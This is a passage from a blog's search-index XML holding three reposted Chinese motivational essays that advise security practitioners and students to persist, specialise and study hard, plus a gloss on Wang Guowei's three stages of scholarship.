        <content type="html"><![CDATA[<p>最近有一些朋友找到我，跟我聊，说自己感觉很迷茫，不知所措，不知道未来该怎么办？安全该怎么做？OKR该怎么写？</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220520193128.png" alt="image-20220520193128139"></p><p>其实我想反问他以下几个问题：</p><p>1.漏洞研究了几个？</p><p>2.样本分析了几个？</p><p>3.这段时间看了多少安全技术类文档？</p><p>4.目前流行的恶意样本家族都有哪些？</p><p>5.目当流行的影响重大漏洞都有哪些？</p><p>6.经典流行的样本和漏洞，你都亲自动手分析调试过吗？</p><p>7.全球流行的黑客组织都有哪些？这些组织都使用了哪些攻击样本？这些样本都利用了哪些漏洞？你了解总结过吗？</p><p>8.这些流行的样本和漏洞，你们公司的产品都做了哪些防护，是否都能检测与防护了?</p><p>9.国内外最新的一些安全事件的样本和漏洞都有研究吗?</p><p>这些你都做了多少，做了哪些？这些都是可以研究的方向和点，为什么会没有事情做呢?又为什么会有时间迷茫呢？你每天的时间都在做什么?每天花了多少时间是在安全研究以及安全相关的事情上？你做了哪些安全方向的总结与规划?</p><p>01</p><p>迷茫的根源在于你想的太多，做的太少，你一方面想快速成为行业里的你所崇拜的那些“牛人”，可以赚更多的钱，但你又不愿意花时间去做努力，觉得太累，总是想一天吃成胖子，快速致富，快速成长，以前我常说做安全就是一门手艺，每个人都可以学，安全的门槛并不高，不需要太高的学历，每个人只要你想学，有兴趣，肯花时间去学就可以了，事实上任何一门手艺都是如止，都是需要花费自己很多的时间和精力，需要长期的研究和积累，才会熟练生巧，很多手艺，只要你肯去学，肯花时间研究，就一定可以学会，至于你能在这个行业走多远，能不能成为这个行业的领导者，就看你能坚持多久，愿意付出多少时间了，就像说相声一样，也是一门手艺，很多人觉得说相声可以赚到很多钱，像郭德刚一样，但你知道他背后花了多少时间去研究相声，去苦练基本功，才能有今天的成就?现在很多人喜欢拜师学艺，把某某某当成老师，拜入他的门下，其实所有的行业都一样，学手艺，都是师傅领进门，修行在个人，不是你拜了某某某，我就很厉害了，你认识某某某，你就很牛了，认识人并不代表你和他一样厉害，你需要的是自己多花时间苦练手艺，师傅能给你的就是一些人生经验与指导</p><p>02</p><p>论天赋，很多人说我在某个方面没有天赋，花再多的时间也达不到别人的高度，所以就干脆放弃了，比我有天赋的人比我更努力，那我努力有什么用呢?确实在任何一个行业，都有一些人是有天赋的，比方某些人天生就是干这个的料，但大部分人是没有天赋的，天才毕竟是少数，这样的天才确实能在某个领域达到很多人无法达到的高度和成就，但天才也需要后天不断的努力的，这个社会上很多人根本还没有到拼天赋的层次，所以咱们拼的不是天赋，拼的是努力，拼的是谁肯花更多的时间而已，人到了一定程序，不要去跟别人去比，而是要跟自己比，每天都要有进步，把安全当成自己一辈子的一份事业，就算你现在很厉害，也要明白，天外有天，人外有人，学习本身就是无止境的，任何一个行业都是需要活到老，学到老，你才能在某个领域有所成就，我们也没有必要去和天才比，因为不可能每个人都成为爱恩斯坦，也不可能每个人都能成为世界首富，很多人的成就，我们可能一辈子再怎么努力也达不到，我们需要在自己的领域坚持做好自己的事就可以了，每天都能在自己善长的方向有所进步和成长</p><p>03</p><p>有时候，我面试一些安全职场的候选人，会去问一些关于技术的问题，看你掌握了什么技术，但是我其实不太关心这个，其实要面技术相关的问题，想面到你哑口无言很容易，我一般会按你的等级去问一些相关的技术问题就可以了，我更喜欢问的是你曾经做了什么?都有哪些产出?有什么成果?这些事你都是怎么做的?你自己的想法与思考等等，因为你曾经做过的事，更能代表你的技术水平，你的一些想法与思考更能代表你是不是真的热爱你所从事的这个岗位，做安全真的需要热爱与兴趣，如果不热爱，也没有兴趣，仅仅是想找份工作，真的做不长，也不会自己主动去做一些事，这样的人很难有更多的成长，我需要一些能主动积极去做事，想做事的朋友跟我一起共事，咱们一起努力，做某个领域的领导者，如果想成为某个领域的领导者，不是看你现在有多么厉害，而是看你将来能不能付出更多，因为你过去的不代表你未来的成就，需要持之以恒，坚持不懈的努力，我认识一些安全界的一些朋友或者是前辈，有一些人其实已经不想去努力了，这样的人可能迟早会被这个行业淘汰或抛弃</p><p>04</p><p>不管你现在有多么厉害，只要你不努力，不坚持学习，过不了几年，你就会被淘汰，同时不管你现在有多么菜，只要你肯坚持，肯努力，肯花时间去学习研究，未来你一定成为这个领域的佼佼者，永远记住，只能让自己变的足够强大，你才能笑到最后</p><p>05</p><p>现在网络非常发达，不是缺少学习资料，而是各种学习资料太多太多了，我们要学会筛选对我们更有用的学习资料，从这些学习资料中找到我们现阶段最需要学习的部分，然后沉下心来一点点去学习研究，踏踏实实一步一个脚印，学习和坚持的过程是很孤独和枯燥的，但如果你真的想在某个方面有所成长和积累，就必需要经历这个过程，台上一分钟，台下十年功，不经历这个过程，你永远无法有所成就</p><p>06</p><p>其实任何一个行业都是一样的，如果你整天想的太多，做的太少，你都会感到迷茫，如果你还觉得迷茫，说明你还不够努力，当你足够努力的时候，你不会感到迷茫，人时常会有一种感觉就是有时候觉得自己很厉害，有时候又觉得自己很无能，厉害说你在努力，无能说明你又在成长，人总是在不断的失望与希望中不断成长的，当你越努力的时候，你看到的会更多，你也会更加感觉自己的渺小，需要花更多的时间去研究，就是在这个过程中不断成长的，如果你一直觉得你很厉害，只能说明你其实啥也不懂，真正懂的人，是不断的在摸索学习，埋头做事，你在这个行业付出了多少时间与汗水，就会得到多少回报，上帝永远是公开的，没有付出，不会有回报，有句话说的好，靠运气得到的，最后都会凭你的实力失去，因为你的能力无法撑起你的野心，所以不管你现在在哪里，从事哪个行业，做哪个方向，请多花时间在你从事的这个职业和方向上吧，因为只有这样，你才能不断成长，才会有更多的回报</p><p>07</p><p>不管你现在从事的哪个行业，希望你能每天多花一点时间去研究你想研究的一些东西，每天都能有所进步，每天睡觉之前问问自己今天都做了什么？</p><p>08</p><p>没有梦想的人是很可悲的，没有自己兴趣或爱好的人是很可怕，如果你身边有这两种人最好都要远离，可悲的人，会给你更多的消极情绪影响到你，可怕的人，可能会给你带来危险，要跟积极乐观向上，有自己兴趣或爱好，有梦想的人在一起，不管是做哪个行业，不管你做的事有多么平凡与普通，每个人都应该有自己的梦想，每个人都应该有自己的兴趣与爱好，在平凡普通的岗位，也要坚持自己的梦想，忠于自己从事的职业与岗位，一辈子坚持做好一件事，日积月累，方成大器，一个人一生能坚持把自己善长的事情做到极致，一辈子能做自己想做的事，并把它坚持到底，因为坚持就是成功！</p><p>转载：<a href="https://mp.weixin.qq.com/s?__biz=MzA4ODEyODA3MQ==&amp;mid=2247485468&amp;idx=1&amp;sn=5f4af6932dc74e67593b2cf6494076de&amp;chksm=902fa734a7582e22deb25ee10c83dd3ae524cc5f3f8e83ab77381e774bec72321c130e5d5031&amp;scene=178#rd">https://mp.weixin.qq.com/s?__biz=MzA4ODEyODA3MQ==&amp;mid=2247485468&amp;idx=1&amp;sn=5f4af6932dc74e67593b2cf6494076de&amp;chksm=902fa734a7582e22deb25ee10c83dd3ae524cc5f3f8e83ab77381e774bec72321c130e5d5031&amp;scene=178#rd</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我对什么都感兴趣，可我迷茫了</title>
      <link href="/2020/11/09/%E6%88%91%E5%AF%B9%E4%BB%80%E4%B9%88%E9%83%BD%E6%84%9F%E5%85%B4%E8%B6%A3%EF%BC%8C%E5%8F%AF%E6%88%91%E8%BF%B7%E8%8C%AB%E4%BA%86/"/>
      <url>/2020/11/09/%E6%88%91%E5%AF%B9%E4%BB%80%E4%B9%88%E9%83%BD%E6%84%9F%E5%85%B4%E8%B6%A3%EF%BC%8C%E5%8F%AF%E6%88%91%E8%BF%B7%E8%8C%AB%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>我收到一个同学给我的邮件问了个在我看来属于“太阳系”级的难题，比宇宙终极难题还差那么些^^</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518110320.jpg" alt="a"></p><p>他问：</p><p>-—————-</p><p>这几天一直挺困惑。说下我的问题，你有空的时候帮我解答下吧。</p><p>今天问自己个问题，找个自己的特长现在开始发展它。</p><p>基本上以后主要就靠这个特长工作。</p><p>但我不知道自己到底对什么非常感兴趣，并能足以支撑我发展研究下去。</p><p>我现在对很多都很有兴趣，这个好玩的程序，渗透个网站，XSS，偶尔挖洞，看见移动设备安全觉得也挺好玩，那些设备安全也很吸引人，木马什么的也很神奇，总之就是好奇的太多。不想自己对什么都好奇的都碰碰，没有自己真正擅长的点，最后到公司只能由人家给我分配岗位，做到最后发现不是真正有兴趣的。</p><p>想请师傅综合一下现在安全方面的发展情况，什么比较缺，帮我分析一下我这怎么办。实在解决不了了。</p><p>很苦恼。</p><p>-—————-</p><p>这个苦恼或者“冥思苦想地思考”是每个人都会遇到的，首先得正能量下：思考这个是好事，最怕的是一辈子都没思考过这样的事，极其可能这人会过于平庸。不过这也不是持续的好事，如果自己跳不出来，找不到那条属于自己的路，那就是坏事了。</p><p>虽然年轻的我们可以不断试错，我们周边的环境也会多少允许我们试错，可如果试错太多就很麻烦了，越发会觉得迷茫。</p><p>针对这位同学的情况，我来简单剖析下。</p><p><strong>第一个问题：感兴趣（好奇）的太多，精的却没有</strong></p><p>这个情况非常普遍，你也意识到了如果没有一个是精的，就无法形成自己的核心竞争力，职场是就是被选择，而不是自己去主导。</p><p>我告诉你个我的例子，我在前端安全或XSS吧，玩的挺深，真的玩是从07年底到现在一直在持续，5年多，可我在知道创宇（08年初进的知道创宇，当时公司创业刚起步），XSS没个屁用，帮不上公司的忙，公司也不会因为我XSS牛逼而重点培养我。</p><p>那怎么办呢？</p><p>我非常早就明白一个道理：</p><ol><li>一个是兴趣：XSS；</li><li>一个是事业：跟随公司创业打拼；</li></ol><p>我要如何把控好两者呢？要知道，我在跟随老大们创业打拼的过程中，从编程、运维、架构、谈判、项目、产品、市场什么都搞过，各种杂事琐事，见证了知道创宇从几个人到现在200人左右。这么多事，且对我来说算是很大的平台，我回头看看我那点XSS简直渺小到不可比拟，所以有人把我定位到XSS里，我会觉得定位太窄太窄。但是，我为什么要把XSS玩精？XSS给我带来的帮助是什么？</p><p>因为我很早很早以前还明白一个道理：一法通则万法通（感谢大学期间时我的一些阅历与孤独思考……），我是一个对万物都好奇的人，就如我在我们那本书里自我表述：我是一个喜欢宇宙学与人类学的人。当我思考的时候我仰望星空，看穿宇宙，发现最终看到了渺小的自己……宇宙如此之大，有趣的是我却在思考它。</p><p>既然玩了XSS，我就真的去吃透JavaScript等各种基础，顺便还让自己成为了一个半吊子程序员，感受编程思想，因为我一直明白：挖到漏洞还不够，漂亮的利用（exp）才是王道，在玩XSS的过程中，逐渐去感悟那个高高在上而近在咫尺的“道”，终于给我悟上了，果然：兴趣+坚持才能给出最美丽的结晶。我见到太多人说：“哇塞，我很有兴趣啊。”然后没能坚持，我真想骂道：“尼玛的，以后别浪费我感情好不好！”兴趣和灵感差不多，顶个屁用，这个世界人才太多了，谁没想到这个，成功就是留给那些立刻执行然后坚持下来的人。</p><p>我悟到的“道”其实就是：独立思考+技术专研的道。为了一个细的不能再细的技术点，我疯狂查阅全球paper，日文的俄文的找Google翻译，吃透就开窍，窍开多了就会悟道。</p><p>这个“道”给我在知道创宇的事业带来了巨大的帮助，我对我的团队很严格，我觉得他们在悟性这方面不应该弱于我，否则根本跟不上我的步伐，肯定会淘汰掉。</p><p>当一个困难摆在我面前的时候，我不是可怜兮兮迷茫要死，但心里会紧张会没底的感觉是正常的，这个时候，就犹如侦探一般，千丝万缕的杂乱线索中，我要冷静找出最优美的那个解决方案，然后立刻执行！</p><p>我还有个优点^^：我会把我的各种经历收获都进行融会贯通，这些经验就好像影子一般，各种形状、暗度都有，然后我会把二维上的这些影子关联思考出背后的那个三维实体（即真相，即自己的思维体系）。</p><p><strong>你的第二个问题是：安全行业什么方向比较好</strong></p><p>能让你悟到“道”的方向就是个好方向。有人说：“哇塞，移动安全热火朝天啊，我要投身进去！”恩，热火朝天是不错，不过扪心自问下：你愿意坚持5年吗？好，你愿意，去吧，哪怕你现在还是菜鸟，勇敢去吃透看雪论坛那些技术帖子吧！勇敢去加入移动安全的圈子吧，勇敢去结交那些TOP n牛人吧！疯狂地、贪婪地，坚持5年，让自己跻身到TOP n！</p><p>你觉得安全运维好多吧？那你去吧；</p><p>你觉得云安全好是吧？那你去吧；</p><p>你觉得当个懂安全的程序员好是吧？那你去吧；</p><p>你觉得当个懂安全的系统架构师好是吧？那你去吧；</p><p>你觉得当个渗透师好是吧？小心点，这条路更难走……如果你有把握走好，那你去吧；</p><p>等等等等。</p><p>选家靠谱的公司（看公司愿景、看老板为人、看同事们的激情等），进去踏踏实实干好事业，记住，至少让一点，哪怕那点再小，也要让自己成为no.1，因为“道”离no.1非常近。</p><p>至于什么方向好不好，用心积累个把年自己能感觉出来的，反正对我来说吧，我很早就思考：如果知道创宇倒闭了，我怎么办呢？哈哈。我唯有在知道创宇倒闭之前，赶紧让自己成为一个尽可能全能的又有几点是挺优秀的人，倒闭后，我自己创业去，至少不会饿死，哈哈哈。</p><p>大家笑笑就行，知道创宇状态良好^^。</p><p>我现在碰到一个类似的问题：创业，我该选什么方向来创业呢？哈哈，多有趣的思考，我抛出这个问题给自己的时候，就会不断去感知这个世界，也许哪天灵感来了，机会来了，我也磨刀霍霍这么久了，说不定就……</p><p>不过独立创业对我来说应该还有点远……</p><p>看到这，这位同学还不能醒悟过来，就真没救了……非得我手把手？这也太容易被自然法则优胜劣汰掉吧……</p><p>-—————-</p><p>最后。</p><p>我其实很不喜欢回答这样的问题，因为无意识地就会拿自己的经历去对比，我从来不会去问别人这样的问题（顶多是互相聊天探讨），我自我感觉智商还可以，这些思考就好像破案一般，千丝万缕总有最后那个真相，真相不一定是美的，却是最现实的。明白这个道理后，我就形成了自己的一种风格了。这个风格略屌……</p><p>你们呢？</p><p>-—————-</p><p>转载：<a href="https://mp.weixin.qq.com/mp/appmsg/show?__biz=MzA3NTEzMTUwNA==&amp;appmsgid=10012013&amp;itemidx=1&amp;sign=4cb58b64c212135b8a4c0494ed9f0596#wechat_redirect">https://mp.weixin.qq.com/mp/appmsg/show?__biz=MzA3NTEzMTUwNA==&amp;appmsgid=10012013&amp;itemidx=1&amp;sign=4cb58b64c212135b8a4c0494ed9f0596#wechat_redirect</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生要耐住寂寞</title>
      <link href="/2020/11/06/%E4%BA%BA%E7%94%9F%E8%A6%81%E8%80%90%E4%BD%8F%E5%AF%82%E5%AF%9E/"/>
      <url>/2020/11/06/%E4%BA%BA%E7%94%9F%E8%A6%81%E8%80%90%E4%BD%8F%E5%AF%82%E5%AF%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518110320.jpg" alt="a"></p><p>​            <code>“古今之成大事业、大学问者，必经过三种境界：‘昨夜西风凋碧树。独上高楼，望尽天涯路’，此第一境也；‘衣带渐宽终不悔，为伊消得人憔悴’，此第二境也；‘众里寻他千百度，蓦然回首，那人却在灯火阑珊处’，此第三境也。”</code> 　 </p><blockquote><h2 id="第一境界"><a href="#第一境界" class="headerlink" title="第一境界"></a>第一境界</h2></blockquote><p>​        <code>“昨夜西风凋碧树。独上高楼，望尽天涯路”的含义是，做学问成大事业者，首先要有执着的追求，登高望远，瞰察路径，明确目标与方向，了解事物的概貌。这也是人生寂寞迷茫、独自寻找目标的阶段</code></p><blockquote><h2 id="第二境界"><a href="#第二境界" class="headerlink" title="第二境界"></a>第二境界</h2></blockquote><p>​            <code>“衣带渐宽终不悔，为伊消得人憔悴”，作者以此两句来比喻成大事业、大学问者，不是轻而易举、随便可得的，必须坚定不移，经过一番辛勤劳动，废寝忘食，孜孜以求，直至人瘦带宽也不后悔。这也是人生的孤独追求阶段。</code> 　</p><blockquote><h2 id="第三境界"><a href="#第三境界" class="headerlink" title="第三境界"></a>第三境界</h2></blockquote><p>​             <code>“众里寻他千百度，蓦然回首，那人却在，灯火阑珊处”是说，做学问、成大事业者，必须有专注的精神，反复追寻、研究，下足功夫，自然会豁然贯通，有所发现，也就自然能够从寂寞王国进入自由王国。这也是人生的实现目标阶段。</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
